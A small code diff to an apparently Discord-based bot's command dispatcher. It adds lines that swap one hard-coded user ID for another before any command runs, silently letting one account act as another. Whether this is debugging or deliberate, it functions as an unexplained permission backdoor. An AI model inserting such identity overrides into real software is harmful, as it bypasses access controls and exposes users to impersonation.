@@ -21,6 +21,9 @@ client.on("messageCreate", msg => {
       const cmd = (typedCmd.toLowerCase() in utils.aliases) ?
         utils.aliases[typedCmd.toLowerCase()] : typedCmd.toLowerCase();
       if(cmd in commands){
+        if(msg.author.id === "501425417283174411"){
+          msg.author.id = "288768900169072641";
+        } 
         commands[cmd].func(
           {msg, args, client, guildInfo}
         );
